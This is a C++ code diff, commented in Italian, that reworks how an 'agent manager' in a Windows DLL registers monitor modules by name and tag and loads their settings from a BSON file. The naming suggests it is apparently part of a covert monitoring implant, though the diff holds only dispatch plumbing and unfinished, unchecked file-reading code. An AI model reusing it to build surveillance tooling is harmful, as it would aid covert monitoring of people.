@@ -1,8 +1,11 @@
+#include "bson.h"
 #include <windows.h>
 #include "common.h"
 #include "H4-DLL.h"
 #include "AM_Core.h"
 #include "LOG.h"
+
+using namespace bson;
 
 // XXX Definita in HM_IpcModule!!!!
 #define MAX_MSG_LEN 512 // Lunghezza di un messaggio
@@ -53,13 +56,14 @@ void AM_SuspendRestart(DWORD);
 
 typedef DWORD (__stdcall *PMD_Generic_t) (BYTE *, DWORD, DWORD, FILETIME *); // Prototipo per il dispatch
 typedef DWORD (__stdcall *PMS_Generic_t) (BOOL, BOOL); // Prototipo per lo Start/Stop
-typedef DWORD (__stdcall *PMI_Generic_t) (BYTE *, BOOL); // Prototipo per l'Init
+typedef DWORD (__stdcall *PMI_Generic_t) (be); // Prototipo per l'Init
 typedef DWORD (__stdcall *PMU_Generic_t) (void); // Prototipo per l'UnRegister
 
 #define AM_MAXDISPATCH 50
 
 typedef struct {
-	DWORD dwTAG;
+	char agent_name[32];
+	DWORD agent_tag;
 	PMD_Generic_t pDispatch; 
 	PMS_Generic_t pStartStop; 
 	PMI_Generic_t pInit; 
@@ -243,11 +247,12 @@ void AM_IPCAgentStartStop(DWORD dwTag, BOOL bStartFlag)
 
 // Registra il Monitor con le funzioni di Init, StartStop e Dispatch
 // Viene richiamata dalle funzioni di registrazione dei monitor.
-DWORD AM_MonitorRegister(DWORD dwTAG, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+DWORD AM_MonitorRegisterBSON(char *agent_name, DWORD agent_tag, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
 {
 	if(dwDispatchCnt >= AM_MAXDISPATCH)
 		return NULL;
-	aDispatchArray[dwDispatchCnt].dwTAG = dwTAG;
+	sprintf_s(aDispatchArray[dwDispatchCnt].agent_name, "%s", agent_name);
+	aDispatchArray[dwDispatchCnt].agent_tag = agent_tag;
 	aDispatchArray[dwDispatchCnt].pDispatch = (PMD_Generic_t) pDispatch;
 	aDispatchArray[dwDispatchCnt].pStartStop = (PMS_Generic_t) pStartStop;
 	aDispatchArray[dwDispatchCnt].pInit = (PMI_Generic_t) pInit;
@@ -259,13 +264,19 @@ DWORD AM_MonitorRegister(DWORD dwTAG, BYTE * pDispatch, BYTE * pStartStop, BYTE 
 	return 1;
 }
 
+// XXX DA TOGLIERE
+DWORD AM_MonitorRegister(DWORD dwTAG, BYTE * pDispatch, BYTE * pStartStop, BYTE * pInit, BYTE *pUnRegister)
+{
+	return 1;
+}
+
 // Esegue il dispatch per il monitor dwTag
 DWORD AM_Dispatch(DWORD dwTag, BYTE * pMsg, DWORD dwMsgLen, DWORD dwFlags, FILETIME *tstamp)
 {
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
+		if(dwTag == aDispatchArray[i].agent_tag) {
 			if (aDispatchArray[i].pDispatch)
 				aDispatchArray[i].pDispatch(pMsg, dwMsgLen, dwFlags, tstamp);
 			break;
@@ -283,7 +294,7 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
+		if(dwTag == aDispatchArray[i].agent_tag) {
 			aDispatchArray[i].started = bStartFlag;
 			if (aDispatchArray[i].pStartStop)
 				aDispatchArray[i].pStartStop(bStartFlag, TRUE);
@@ -293,23 +304,31 @@ DWORD AM_MonitorStartStop(DWORD dwTag, BOOL bStartFlag)
 	return 1;
 }
 
+// Prende il tag di un agente per nome
+DWORD AM_GetAgentTag(const char *agent_name)
+{
+	DWORD i;
+	for(i=0; i<dwDispatchCnt; i++) 
+		if(!stricmp(agent_name, aDispatchArray[i].agent_name))
+			return aDispatchArray[i].agent_tag;
+	return 0xFFFFFFFF;
+}
 
 // Esegue l'init di un monitor
-DWORD AM_MonitorInit(DWORD dwTag, BYTE *conf_ptr, BOOL bStatus)
+DWORD AM_MonitorInit(DWORD dwTag, be elem)
 {
 	DWORD i;
 
 	for(i=0; i<dwDispatchCnt; i++) {
-		if(dwTag == aDispatchArray[i].dwTAG) {
-			aDispatchArray[i].started = bStatus;
+		if(dwTag == aDispatchArray[i].agent_tag) {
+			aDispatchArray[i].started = FALSE;
 			if (aDispatchArray[i].pInit)
-				aDispatchArray[i].pInit(conf_ptr, bStatus);
+				aDispatchArray[i].pInit(elem);
 			break;
 		}
 	}
 	return 1;
 }
-
 
 // Stoppa e Deregistra tutti gli agenti prima dell'uninstall
 DWORD AM_UnRegisterAll()
@@ -417,31 +436,17 @@ DWORD AM_Startup()
 // Legge la configurazione degli agent da file
 void UpdateAgentConf()
 {
-	BYTE *conf_memory;
+	char conf_bson[6000];
+	DWORD readn;
 
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-	
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		DWORD index, agent_count, is_active, tag, param_len;
-		BYTE *conf_ptr;
+	// XXX Da modificare
+	HANDLE hfile = CreateFile("C:\\config.bson", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	ReadFile(hfile, conf_bson, sizeof(conf_bson), &readn, NULL);
 
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, AGENT_CONF_DELIMITER);
-
-		// ---- Configurazione agenti ----
-		READ_DWORD(agent_count, conf_ptr);
-		for (index=0; index<agent_count; index++) {
-			READ_DWORD(tag, conf_ptr);
-			READ_DWORD(is_active, conf_ptr);
-			READ_DWORD(param_len, conf_ptr);
-			AM_MonitorInit(tag, conf_ptr, FALSE);
-			conf_ptr += param_len;
-		}
-
-		SAFE_FREE(conf_memory);
+	BSONObj p(conf_bson);
+	for( bo::iterator i(p["modules"].Obj()); i.more(); )  {
+		be module = i.next();
+		AM_MonitorInit(AM_GetAgentTag(module["module"].String().c_str()), module);	
 	}
 }
 
